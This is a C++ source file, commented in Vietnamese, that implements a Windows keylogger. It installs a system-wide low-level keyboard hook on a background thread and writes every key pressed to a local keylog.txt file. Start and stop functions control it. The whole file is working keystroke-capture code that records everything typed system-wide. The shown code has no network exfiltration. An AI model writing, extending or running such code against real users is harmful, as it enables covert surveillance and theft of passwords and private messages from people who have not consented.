#include "keylogging.h"

#ifdef _WIN32
    #include <windows.h>
    #include <winuser.h>
    #pragma comment(lib, "user32.lib")
#endif

// Cờ hiệu an toàn luồng để ra lệnh dừng
static std::atomic<bool> g_isKeylogging(false);

// Handle của hook
static HHOOK g_keyboardHook = NULL;

// Luồng chạy vòng lặp message
static std::thread g_loggerThread;

// ID của luồng để có thể gửi tín hiệu dừng
static DWORD g_loggerThreadId = 0;

// === HÀM GHI LOG ===
void logKeystroke(int key)
{
    std::ofstream logFile;
    logFile.open("keylog.txt", std::ios::app);

    if (key == VK_BACK)
        logFile << "[BACKSPACE]";
    else if (key == VK_RETURN)
        logFile << "[ENTER]\n";
    else if (key == VK_TAB)
        logFile << "[TAB]";
    else if (key == VK_SPACE)
        logFile << " ";
    else if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT)
        logFile << "[SHIFT]";
    else if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL)
        logFile << "[CTRL]";
    else if (key == VK_MENU || key == VK_LMENU || key == VK_RMENU)
        logFile << "[ALT]";
    else if (key == VK_ESCAPE)
        logFile << "[ESC]";
    else if (key == VK_OEM_PERIOD)
        logFile << ".";
    else if (key >= VK_NUMPAD0 && key <= VK_NUMPAD9)
        logFile << (key - VK_NUMPAD0);
    else if (key >= '0' && key <= '9')
        logFile << char(key);
    else if (key >= 'A' && key <= 'Z')
        logFile << char(key);
    else
        logFile << "[" << key << "]";

    logFile.close();
}

// === HÀM HOOK CALLBACK ===

/**
 * @brief Đây là hàm mà Windows gọi mỗi khi có phím được nhấn.
 */
LRESULT CALLBACK keyboardPRoc(int nCode, WPARAM wParam, LPARAM lParam)
{
    // Chỉ xử lý nếu là một hành động hợp lệ
    if (nCode == HC_ACTION)
    {
        // Chỉ quan tâm khi phím được NHẤN XUỐNG
        // (Bỏ qua WM_KEYUP để tránh log 2 lần)
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
        {
            // lParam chứa thông tin về phím
            KBDLLHOOKSTRUCT *pkb = (KBDLLHOOKSTRUCT *)lParam;
            logKeystroke(pkb->vkCode); // Gửi mã phím đến hàm log
        }
    }

    // Chuyển sự kiện cho hook tiếp theo trong chuỗi
    return CallNextHookEx(g_keyboardHook, nCode, wParam, lParam);
}


// === HÀM CHẠY TRÊN LUỒNG ===

/**
 * @brief Hàm này chạy trên một luồng riêng biệt.
 * Nó thiết lập hook và chạy vòng lặp tin nhắn.
 */
void runHookLoop()
{
    // Lấy ID của luồng này để luồng chính có thể gửi tín hiệu dừng
    g_loggerThreadId = GetCurrentThreadId();

    // Cài đặt hook
    // WH_KEYBOARD_LL = Low-Level Keyboard hook (theo dõi toàn hệ thống)
    g_keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardPRoc, NULL, 0);
    
    if (!g_keyboardHook)
    {
        // Nếu cài hook thất bại, tắt cờ
        g_isKeylogging.store(false);
        return;
    }

    // VÒNG LẶP TIN NHẮN
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0)
    {
        // Nếu nhận được tin nhắn WM_QUIT (từ stopKeylogger)
        if (msg.message == WM_QUIT)
        {
            break; // Thoát vòng lặp
        }
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Dọn dẹp trước khi thoát luồng
    UnhookWindowsHookEx(g_keyboardHook);
    g_keyboardHook = NULL;
    g_loggerThreadId = 0;
}

void startKeylogger()
{
    // Nếu chưa chạy thì mới chạy
    if (!g_isKeylogging.load())
    {
        g_isKeylogging.store(true);
        // Bắt đầu luồng mới, trỏ vào hàm runHookLoop
        g_loggerThread = std::thread(runHookLoop);
    }
}

void stopKeylogger()
{
    // Nếu đang chạy thì mới dừng
    if (g_isKeylogging.load())
    {
        g_isKeylogging.store(false);

        // Gửi tin nhắn WM_QUIT đến luồng hook
        if (g_loggerThreadId != 0)
        {
            PostThreadMessage(g_loggerThreadId, WM_QUIT, 0, 0);
        }

        // Đợi luồng chạy xong và dọn dẹp
        if (g_loggerThread.joinable())
        {
            g_loggerThread.join();
        }
    }
}

bool isKeyloggerRunning()
{
    return g_isKeylogging.load();
}